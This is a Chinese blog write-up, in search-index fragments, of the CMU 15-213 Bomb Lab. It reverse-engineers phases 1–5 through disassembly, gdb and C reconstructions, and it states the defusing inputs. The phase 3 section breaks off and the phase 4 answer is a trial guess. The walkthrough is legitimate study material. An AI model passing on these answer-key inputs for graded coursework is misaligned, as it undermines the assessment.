bomb.s生成二进制可执行文件的反汇编并存储在bomb.s中。bomb.c中只有main函数的部分，main函数调用的那些函数只在二进制文件和汇编代码中存在。 我们首先来看bomb.c，其中含有 6 个 phase 的炸弹，我们需要依次解开。在函数最开始处作者声明可以有多种输入格式，可以从stdin获取输入，也可以从文件获取输入。每个 phase 都有如下两行： c phase_n(input); /* Run the phase */ phase_defused(); /* Drat! They figured it out! ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:2:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#题目浏览"},{"categories":["系统入门"],"content":" 14 phase1 分析: 基础读值phase_1的汇编代码如下： text 0000000000400ee0 \u003cphase_1\u003e: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 \u003cstrings_not_equal\u003e 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 \u003cphase_1+0x17\u003e 400ef2: e8 43 05 00 00 callq 40143a \u003cexplode_bomb\u003e 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq 其过程如下： 留出 8 个字节的空间 让%esi = 0x402400， 调用strings_not_equal函数 测试%eax是否等于 0 若返回值为 0，则恢复栈帧，退出 否则引爆炸弹 这里推测%esi是给strings_not_equal提供的参数，且string_not_equal返回的是个int类型整数。 我们打开gdb，打好断点并运行，输入call strings_not_equal(\"a\",\"a\")发现返回 0。输入call string_length(\"a\")发现返回 1。那么strings_not_equal的作用就是判断两字符串是否不相等，string_length的作用就是计算字符串的长度。 我们的目的是让strings_not_equal返回 0，也就是说我们需要传入两个相同的字符串。那么问题在于我们传入的字符串存储在哪里呢？我们看一下strings_not_equal的反汇编代码： asm 0000000000401338 \u003cstrings_not_equal\u003e: seg1: 401338: 41 54 push %r12 40133a: 55 push %rbp 40133b: 53 push %rbx 40133c: 48 89 fb mov %rdi,%rbx 40133f: 48 89 f5 mov %rsi,%rbp 401342: e8 d4 ff ff ff callq 40131b \u003cstring_length\u003e 401347: 41 89 c4 mov %eax,%r12d 40134a: 48 89 ef mov %rbp,%rdi 40134d: e8 c9 ff ff ff callq 40131b \u003cstring_length\u003e 401352: ba 01 00 00 00 mov $0x1,%edx 401357: 41 39 c4 cmp %eax,%r12d 40135a: 75 3f jne 40139b \u003cstrings_not_equal+0x63\u003e 40135c: 0f b6 03 movzbl (%rbx),%eax 40135f: 84 c0 test %al,%al 401361: 74 25 je 401388 \u003cstrings_not_equal+0x50\u003e 401363: 3a 45 00 cmp 0x0(%rbp),%al 401366: 74 0a je 401372 \u003cstrings_not_equal+0x3a\u003e 401368: eb 25 jmp 40138f \u003cstrings_not_equal+0x57\u003e seg2: 40136a: 3a 45 00 cmp 0x0(%rbp),%al 40136d: 0f 1f 00 nopl (%rax) 401370: 75 24 jne 401396 \u003cstrings_not_equal+0x5e\u003e seg3: 401372: 48 83 c3 01 add $0x1,%rbx 401376: 48 83 c5 01 add $0x1,%rbp 40137a: 0f b6 03 movzbl (%rbx),%eax 40137d: 84 c0 test %al,%al 40137f: 75 e9 jne 40136a \u003cstrings_not_equal+0x32\u003e 401381: ba 00 00 00 00 mov $0x0,%edx 401386: eb 13 jmp 40139b \u003cstrings_not_equal+0x63\u003e seg4: 401388: ba 00 00 00 00 mov $0x0,%edx 40138d: eb 0c jmp 40139b \u003cstrings_not_equal+0x63\u003e seg5: 40138f: ba 01 00 00 00 mov $0x1,%edx 401394: eb 05 jmp 40139b \u003cstrings_not_equal+0x63\u003e seg6: 401396: ba 01 00 00 00 mov $0x1,%edx seg7: 40139b: 89 d0 mov %edx,%eax 40139d: 5b pop %rbx 40139e: 5d pop %rbp 40139f: 41 5c pop %r12 4013a1: c3 retq 其 C 语言代码分析如下： c seg2() { if(al != *rbp) { seg6(); } else{ seg3(); } } seg3() { rbx += 1; rbp += 1; eax = *rbx; if(al != 0) { // seg2 seg2(); } else { edx = 0; seg7(); } } seg4() { edx = 0; seg7(); } seg5() { edx = 1; seg7(); } seg6() { edx = 1; seg7(); } seg7() { eax = edx; //还原rbx rbp r12 return eax; } // 传入参数有 rdi rsi，返回值在eax中 int strings_not_equal(char* str) { // seg1 // 保存r12 rbp rbx的值 rbx = rdi rbp = rsi call string_length r12d = eax rdi = rbp call string_length edx = 0x1; if(r12d != eax) { seg7(); } else { eax = *rbx; if(al == 0) { seg4(); } else { if(al == *rbp) { seg3(); } else { seg5(); } } } } 我们对调用的函数string_length反汇编看一下： text 000000000040131b \u003cstring_length\u003e: 40131b: 80 3f 00 cmpb $0x0,(%rdi) 40131e: 74 12 je 401332 \u003cstring_length+0x17\u003e 401320: 48 89 fa mov %rdi,%rdx 401323: 48 83 c2 01 add $0x1,%rdx 401327: 89 d0 mov %edx,%eax 401329: 29 f8 sub %edi,%eax 40132b: 80 3a 00 cmpb $0x0,(%rdx) 40132e: 75 f3 jne 401323 \u003cstring_length+0x8\u003e 401330: f3 c3 repz retq 401332: b8 00 00 00 00 mov $0x0,%eax 401337: c3 retq 其 C 语言转化如下： c // 传入参数为 rdi，推测其为字符串的首地址 int string_length() { if(*rdi == 0x0) { rax = 0; return rax; } rdx = rdi; do{ rdx += 0x1; eax = edx; eax -= edi; }while(*rdx != 0x0); return rax; } 因为string_length中传入的应该是字符串首地址，存储在寄存器%rdi中。而strings_not_equal中我们使用了两个寄存器%rdi和%rsi，那么%rsi中保存的应该是第二个字符串的地址。而在phase_1中，我们让%rsi = 0x402400，也就是说0x402400这里有个字符串，我们要让输入的字符串和这里的字符串相同，才能让%rax = 0。 输入x/s 0x402400，得到如下结果： text (gdb) x/s 0x402400 0x402400: \"Border relations with Canada have never been better.\" 这就是我们应该在phase_1中输入的字符串了！让我们来试试！结果如下： text (gdb) Phase 1 defused. How about the next one? 81 printf(\"Phase 1 defused. How about the next one?\\n\"); 成功！现在准备解决phase_2的问题，gdb先不管。 ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#phase1-分析-基础读值"},{"categories":["系统入门"],"content":" 15 phase2 分析: 分支跳转 \u0026 循环phase_2的反汇编如下： text 0000000000400efc \u003cphase_2\u003e: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c \u003cread_six_numbers\u003e 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) 400f0e: 74 20 je 400f30 \u003cphase_2+0x34\u003e 400f10: e8 25 05 00 00 callq 40143a \u003cexplode_bomb\u003e 400f15: eb 19 jmp 400f30 \u003cphase_2+0x34\u003e 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) 400f1e: 74 05 je 400f25 \u003cphase_2+0x29\u003e 400f20: e8 15 05 00 00 callq 40143a \u003cexplode_bomb\u003e 400f25: 48 83 c3 04 add $0x4,%rbx 400f29: 48 39 eb cmp %rbp,%rbx 400f2c: 75 e9 jne 400f17 \u003cphase_2+0x1b\u003e 400f2e: eb 0c jmp 400f3c \u003cphase_2+0x40\u003e 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp 400f3a: eb db jmp 400f17 \u003cphase_2+0x1b\u003e 400f3c: 48 83 c4 28 add $0x28,%rsp 400f40: 5b pop %rbx 400f41: 5d pop %rbp 400f42: c3 retq 我们将其转化为 C 语言试试： c // // 400f17 // eax = *(rbx - 0x4); // eax *= 2; // if(*rbx == eax) { // rbx += 4; // if(rbx != rbp) // //400f17 // else // //400f3c // //恢复栈空间和rbp rbx // return eax; // }else { // call explode_bomb // } int phase_2() { //保存rbp rbx //rsp留出40个字节 rsi = rsp; call read_six_numbers if(*rsp == 0x1) { // 400f30 rbx = rsp + 0x4; rbp = rsp + 24; // 400f17改写为循环 do { eax = *(rbx - 0x4); eax *= 2; if(*rbx != eax) call explode_bomb rbx += 4; }while(rbx != rbp) return eax; } else { call explode_bomb } } 我们对read_six_numebrs反汇编一下看看： text 000000000040145c \u003cread_six_numbers\u003e: 40145c: 48 83 ec 18 sub $0x18,%rsp 401460: 48 89 f2 mov %rsi,%rdx 401463: 48 8d 4e 04 lea 0x4(%rsi),%rcx 401467: 48 8d 46 14 lea 0x14(%rsi),%rax 40146b: 48 89 44 24 08 mov %rax,0x8(%rsp) 401470: 48 8d 46 10 lea 0x10(%rsi),%rax 401474: 48 89 04 24 mov %rax,(%rsp) 401478: 4c 8d 4e 0c lea 0xc(%rsi),%r9 40147c: 4c 8d 46 08 lea 0x8(%rsi),%r8 401480: be c3 25 40 00 mov $0x4025c3,%esi 401485: b8 00 00 00 00 mov $0x0,%eax 40148a: e8 61 f7 ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 40148f: 83 f8 05 cmp $0x5,%eax 401492: 7f 05 jg 401499 \u003cread_six_numbers+0x3d\u003e 401494: e8 a1 ff ff ff callq 40143a \u003cexplode_bomb\u003e 401499: 48 83 c4 18 add $0x18,%rsp 40149d: c3 retq 这里也有explode_bomb，有玄机啊~ 先分析read_six_numbers，这里就一个跳转，整个过程容易分析： text 1. 保留 24 个字节的位置 2. rdx = rsi 3. rcx = rsi + 0x4 4. rax = rsi + 20 5. *(rsp + 8) = rax 6. rax = rsi + 16 7. *rsp = rax 8. r9 = rsi + 12 9. r8 = rsi + 8 10. esi = 0x4025c3 11. eax = 0 12. call sccanf 获取输入 13. if(eax \u003e 5) 恢复栈，返回 eax 14. 否则爆炸 这里传入的应该只有一个参数，就是%rsi寄存器中的值，在前面phase_2里面%rsi = %rsp。那么输入的值应该是从%rsp开始存储。我们使用如下命令打印0x4025c3处的值，得到如下结果： text (gdb) x/s 0x4025c3 0x4025c3: \"%d %d %d %d %d %d\" 这里%eax中存储的应该是sscanf读入的数据个数，如果%eax \u003e 5的话，read_six_numbers顺利过关，否则爆炸。 那么数组应该是保存在%rsi指向的位置（也就是一开始%rsp指向的位置），通过分析phase_2的代码，我们可以总结出以下要求： 输入的第 1 个数必须是 1 下一个数是前一个数的两倍 输入 6 个数字，而且是整数，不是浮点数 那么了解了要求后，我们需要输入1 2 4 8 16 32这 6 个数，看看结果： text (gdb) That's number 2. Keep going! 88 printf(\"That's number 2. Keep going!\\n\"); phase_2破解成功！我们继续phase_3！ ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:4:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#phase2-分析-分支跳转--循环"},{"categories":["系统入门"],"content":" 16 phase3 分析：switch语句phase_3的反汇编代码如下： text 0000000000400f43 \u003cphase_3\u003e: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a \u003cphase_3+0x27\u003e 400f65: e8 d0 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad \u003cphase_3+0x6a\u003e 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 400f7c: b8 cf 00 00 00 mov $0xcf,%eax 400f81: eb 3b jmp 400fbe \u003cphase_3+0x7b\u003e 400f83: b8 c3 02 00 00 mov $0x2c3,%eax 400f88: eb 34 jmp 400fbe \u003cphase_3+0x7b\u003e 400f8a: b8 00 01 00 00 mov $0x100,%eax 400f8f: eb 2d jmp 400fbe \u003cphase_3+0x7b\u003e 400f91: b8 85 01 00 00 mov $0x185,%eax 400f96: eb 26 jmp 400fbe \u003cphase_3+0x7b\u003e 400f98: b8 ce 00 00 00 mov $0xce,%eax 400f9d: eb 1f jmp 400fbe \u003cphase_3+0x7b\u003e 400f9f: b8 aa 02 00 00 mov $0x2aa,%eax 400fa4: eb 18 jmp 400fbe \u003cphase_3+0x7b\u003e 400fa6: b8 47 01 00 00 mov $0x147,%eax 400fab: eb 11 jmp 400fbe \u003cphase_3+0x7b\u003e 400fad: e8 88 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400fb2: b8 00 00 00 00 mov $0x0,%eax 400fb7: eb 05 jmp 400fbe \u003cphase_3+0x7b\u003e 400fb9: b8 37 01 00 00 mov $0x137,%eax 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 \u003cphase_3+0x86\u003e 400fc4: e8 71 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400fc9: 48 83 c4 18 add $0x18,%rsp 400fcd: c3 retq 这段代码较长，我们将其转化为 C 语言试试： 我们先不转化成 C 语言，先来看一下让炸弹爆炸的几个条件。炸弹爆炸出现在如下几个地方： text 400f65: e8 d0 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400fad: e8 88 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400fc4: e8 71 04 00 00 callq 40143a \u003cexplode_bomb\u003e 对第一处，我们先进行分析： text 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a \u003cphase_3+0x27\u003e 400f65: e8 d0 04 00 00 callq 40143a \u003cexplode_bomb\u003e 这段代码首先分配了 24 个字节的栈空间，随后做了如下步骤： rcx = rsp + 12 rdx = rsp + 8 esi = 0x4025cf eax = 0 call sscanf 将 eax 与 1 进行比较 如果 eax \u003e 1，跳转到400f6a 否则炸弹爆炸 这段代码和我们上一段看到的sscanf之前的代码非常相似，0x4025cf多半是一个让你输入一串东西的指令地址，我们看一下%esi(0x4025cf)附近的值等于多少： text (gdb) x/s 0x4025cf 0x4025cf: \"%d %d\" 这里说明我们需要输入 2 个数字，如果不是输入 2 个数字的话，炸弹就会爆炸。第一个要求明确了。 再来看第二处炸弹的位置前后的代码，它的上一条代码是个jmp，那么就不可能从那儿执行到这儿来，因为炸弹爆炸了，所以他后面的代码也不可能执行，所以我们只需要看看哪些代码会跳转到这一条(400fad)上来。 text 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) 400f6f: 77 3c ja 400fad \u003cphase_3+0x6a\u003e 这段代码出现在我们获取了两个整数之后。这段代码比较了*(rsp + 8)和0x7的值。为了不跳转到400fad，我们需要让%rsp + 8 \u003c= 0x7。第二个要求明确了。 最后一个炸弹前的代码如下： text 400fb9: b8 37 01 00 00 mov $0x137,%eax 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 \u003cphase_3+0x86\u003e 400fc4: e8 71 04 00 00 callq 40143a \u003cexplode_bomb\u003e 这段代码中实现如下操作： eax = 0x137 如果eax != *(rsp + 12)，那么炸弹爆炸，也就是说输入的第二个参数最后必须等于0x137 现在问题来了，有几个代码通过跳转来到了400fbe位置，我们需要分析其情况，看看其是否对%rsp + 12处的值做了操作。 text 400f7c: b8 cf 00 00 00 mov $0xcf,%eax -\u003eeax = 0xcf 400f81: eb 3b jmp 400fbe \u003cphase_3+0x7b\u003e 400f83: b8 c3 02 00 00 mov $0x2c3,%eax -\u003e eax = 0x2c3 400f88: eb 34 jmp 400fbe \u003cphase_3+0x7b\u003e 400f8a: b8 00 01 00 00 mov $0x100,%eax -\u003e eax = 0x100 400f8f: eb 2d jmp 400fbe \u003cphase_3+0x7b\u003e 400f91: b8 85 01 00 00 mov $0x185,%eax -\u003e eax = 0x185 400f96: eb 26 jmp 400fbe \u003cphase_3+0x7b\u003e 400f98: b8 ce 00 00 00 mov $0xce,%eax -\u003e eax = 0xce 400f9d: eb 1f jmp 400fbe \u003cphase_3+0x7b\u003e 400f9f: b8 aa 02 00 00 mov $0x2aa,%eax -\u003e eax = 0x2aa 400fa4: eb 18 jmp 400fbe \u003cphase_3+0x7b\u003e 400fa6: b8 47 01 00 00 mov $0x147,%eax -\u003e eax = 0x147 400fab: eb 11 jmp 400fbe \u003cphase_3+0x7b\u003e 400fad: e8 88 04 00 00 callq 40143a \u003cexplode_bomb\u003e 400fb2: b8 00 00 00 00 mov $0x0,%eax -\u003e eax = 0 400fb7: eb 05 jmp 400fbe \u003cphase_3+0x7b\u003e 400fb9: b8 37 01 00 00 mov $0x137,%eax -\u003e eax = 0x137 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax 400fc2: 74 05 je 400fc9 \u003cphase_3+0x86\u003e 400fc4: e8 71 ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:5:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#phase3-分析switch语句"},{"categories":["系统入门"],"content":" 17 phase4 分析：递归首先还是对phase_4进行了反汇编： text 000000000040100c \u003cphase_4\u003e: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 401029: 83 f8 02 cmp $0x2,%eax 40102c: 75 07 jne 401035 \u003cphase_4+0x29\u003e 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) 401033: 76 05 jbe 40103a \u003cphase_4+0x2e\u003e 401035: e8 00 04 00 00 callq 40143a \u003cexplode_bomb\u003e 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi 401048: e8 81 ff ff ff callq 400fce \u003cfunc4\u003e 40104d: 85 c0 test %eax,%eax 40104f: 75 07 jne 401058 \u003cphase_4+0x4c\u003e 401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) 401056: 74 05 je 40105d \u003cphase_4+0x51\u003e 401058: e8 dd 03 00 00 callq 40143a \u003cexplode_bomb\u003e 40105d: 48 83 c4 18 add $0x18,%rsp 401061: c3 retq 在本代码中进行了如下过程： 预留出 24 个字节的空间 rcx = rsp + 12 rdx = rsp + 8 esi = 0x4025cf eax = 0 sscanf 调用 下面是带分支部分： c if(eax != 0x2) { call bomb_explode } if(arg3 \u003e 0xe) { call bomb_explode } edx = 0xe; esi = 0x0; edi = arg3 ret = func4(arg1,arg2,arg3) if(eax != 0) call bomb_explode if(arg2 == 0) return eax; else call bomb_explode 这里出现了非常熟悉的sscanf调用，我们先看看0x4025cf处是啥（如果不出意外应该是%d %d） text (gdb) x/s 0x4025cf 0x4025cf: \"%d %d\" 果然！果然！是让我们输入 2 个整数，如果不是两个的话就爆炸！此外，一开始的arg3应该小于等于0xe，否则爆炸，此外函数func4返回的eax应该为 0，否则爆炸。此外，*(rsp + 12)（如果func4里面没改变这个值的话应该还是arg2）必须等于 0。 那么我们来分析一下func4： text 0000000000400fce \u003cfunc4\u003e: 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx 400fd8: c1 e9 1f shr $0x1f,%ecx 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 \u003cfunc4+0x24\u003e 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce \u003cfunc4\u003e 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 \u003cfunc4+0x39\u003e 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 \u003cfunc4+0x39\u003e 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce \u003cfunc4\u003e 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 retq 看起来有点长，但是不要惊慌！这里只有 3 个跳转，而且其中两个都是跳转到最后恢复栈的位置。其主要步骤如下： 分配 8 个字节的栈空间 eax = edx eax -= esi -\u003e eax = edx - esi ecx = eax ecx » 31 -\u003e ecx = eax » 31(eax 符号位拉满) eax += ecx eax » 1 -\u003e eax = (eax + ecx) » 1 ecx = rax + rsi 下面进入一段分支： c if(ecx \u003c= edi) { //400ff2 eax = 0; if(ecx \u003e= edi) { // 401007 return rax; } else{ esi = rcx + 0x1; ret = func4(arg1,arg2,arg3) eax = rax + rax + 1; return rax; } } else { edx = rcx - 0x1; ret = func4(arg1,arg2,arg3) eax = eax * 2; return rax; } 分析func4，我们不难发现，该函数的传入参数是%edx和%esi，此外该函数是个递归函数。函数总的过程应该如下： c eax = edx - esi ecx = eax \u003e\u003e 31 (逻辑右移) eax = (eax + ecx) \u003e\u003e 1 (算数右移) ecx = rax + rsi if(ecx \u003c= edi) { eax = 0; if(ecx \u003e= edi) { // 401007 return rax; } else{ esi = rcx + 0x1; ret = func4(arg1,arg2,arg3) eax = rax * 2 + 1; return rax; } } else { edx = rcx - 0x1; ret = func4(arg1,arg2,arg3) eax = eax * 2; return rax; } 经过变量调整重写的 C 版本如下： c ret = arg3 - arg2 mid = ret \u003e\u003e 31 ret = (ret + ret \u003e\u003e 31) / 2; mid = ret + arg2 if(mid \u003c= arg1) { ret = 0; if(mid \u003e= arg1) { return ret; } else{ // arg2 = mid + 1; return func4(arg1,mid + 1,arg3) * 2 + 1; } } else { // arg3 = mid - 1; return func4(arg1,arg2,mid - 1) * 2; } 我们看看什么情况下eax = 0。（这到底是什么东西啊摔！）真没看懂是什么东西，试了个0 0，通过了，先 mark 一下，后面再来检验： text (gdb) 0 0 95 printf(\"Halfway there!\\n\"); ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:6:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#phase4-分析递归"},{"categories":["系统入门"],"content":" 18 phase5 分析: canary，循环与 ASCII 编码字符串 text (gdb) 97 /* Oh yeah? Well, how good is your math? Try on this saucy problem! */ 数学不好呜呜呜。 phase_5 的反汇编代码如下： text 0000000000401062 \u003cphase_5\u003e: seg1: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp 401067: 48 89 fb mov %rdi,%rbx 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) 401078: 31 c0 xor %eax,%eax 40107a: e8 9c 02 00 00 callq 40131b \u003cstring_length\u003e 40107f: 83 f8 06 cmp $0x6,%eax 401082: 74 4e je 4010d2 \u003cphase_5+0x70\u003e 401084: e8 b1 03 00 00 callq 40143a \u003cexplode_bomb\u003e 401089: eb 47 jmp 4010d2 \u003cphase_5+0x70\u003e seg2: 40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx 401096: 83 e2 0f and $0xf,%edx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax 4010ac: 75 dd jne 40108b \u003cphase_5+0x29\u003e 4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3: be 5e 24 40 00 mov $0x40245e,%esi 4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd: e8 76 02 00 00 callq 401338 \u003cstrings_not_equal\u003e 4010c2: 85 c0 test %eax,%eax 4010c4: 74 13 je 4010d9 \u003cphase_5+0x77\u003e 4010c6: e8 6f 03 00 00 callq 40143a \u003cexplode_bomb\u003e 4010cb: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0: eb 07 jmp 4010d9 \u003cphase_5+0x77\u003e seg3: 4010d2: b8 00 00 00 00 mov $0x0,%eax 4010d7: eb b2 jmp 40108b \u003cphase_5+0x29\u003e seg4: 4010d9: 48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 4010e5: 00 00 4010e7: 74 05 je 4010ee \u003cphase_5+0x8c\u003e 4010e9: e8 42 fa ff ff callq 400b30 \u003c__stack_chk_fail@plt\u003e seg5: 4010ee: 48 83 c4 20 add $0x20,%rsp 4010f2: 5b pop %rbx 4010f3: c3 retq 整个过程还原为 C 语言如下： c // 这个函数的参数是： %rdi int phase5(char* buf) { // 保存 rbx // 留出 32 个字节的空间 rbx = rdi // buf 的地址保存在 rbx 中 *(rsp + 24) = canary eax = 0 // 返回值 = 0 call string_length // 返回字符串长度 if(eax == 0x6) { eax = 0 // //seg2 // ecx = *(rbx + rax) // *rsp = cl // rdx = *rsp // edx = edx \u0026 0xf // edx = *(rdx + 0x4024b0) // *(rsp + rax + 16) = dl // rax = rax \u0026 0x1 // if(rax != 0x6) // jump to seg2 // seg2 应该是个循环，其格式如下： do { ecx = *(rbx + rax) -\u003e 把(str+i)指向的4个字节赋给ecx *rsp = cl -\u003e rsp指向处存储ecx的最低一个字节 rdx = *rsp -\u003e rdx = 最低的那个字节 edx = edx \u0026 0xf -\u003e edx = 最低4位 edx = *(rdx + 0x4024b0) -\u003e edx = *(最低四位 + 0x4024b0) *(rsp + rax + 16) = dl -\u003e rsp[i + 16] = edx的最低四位 rax = rax + 0x1 -\u003e rax 递增 }while(rax != 0x6); *(rsp + 22) = 0 -\u003e rsp[22] = 0 // 字符串的末尾是`\\0` esi = 0x40245e rdi = rsp + 16 call strings_not_equal // 判断 esi处的字符串和 rsp + 16处的6个字节的字符串是否相等 if(eax == 0) { // seg4 rax = *(rsp + 24) // canary // compare rax and canary if(rax == canary) { //seg5 // release the stack return rax; } else { call __stack_chk_fail } }else { call bomb_explode } } else { call bomb_explode } } 0x40245e处的字符串如下： text (gdb) x/s 0x40245e 0x40245e: \"flyers\" 从上面的内容中我们可以看出： 必须输入 6 个字符长度的字符串，否则炸弹爆炸 rsp + 16处的字符串和0x40245e处的字符串flyers相同。 我们需要计算一下 seg2 那段到底对字符串做了什么操作：edx的值 = *(0x4024b0 + str[i]的最低4位)，然后str[i] = edx最低四位 最后str需要等于flyers，也就是说*(0x4024b0 + str[i]的最低4位)的最低4位 = flyers 其中flyers的编码为：0x40245e: 0x66 0x6c 0x79 0x65 0x72 0x73 0x00，最后一个0x00在程序中手动设置了，所以无需自己设置。 打印一下0x4024b0开始的字符串：maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you? 因此，本题的目的是在0x4024b0开始的字符串中拼凑出flyers，然后把每个字符相对于开头的偏移量计算出来。其几个字符的地址分别是： f:0x09 l:0x0f y:0x0e ers:0x05 0x06 0x07 综合起来是：0x09 0x0f 0x0e 0x05 0x06 0x07。我们来试一下*(0x4024b0 + str[i]的最低4位)是否等于flyers。测试出来是这样的。但是这 6 个字节不是字符，为了凑成字符，我们对每个数字加上 64（因为在计算的时候只取最低 4 位，所以对一个字节加上 64 不影响最后的偏移量），得到73, 79,78, 69, 70, 71(这里是 10 进制)，其对应的 ASCII 码是IONEFG。 ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:7:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#phase5-分析-canary循环与-ascii-编码字符串"},{"categories":["系统入门"],"content":" 19 phase6 分析: 超级无敌杂糅嵌套多层循环phase_6 反汇编如下（哎哟我滴妈呀咋个这么长啊）： text 00000000004010f4 \u003cphase_6\u003e: seg1: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov 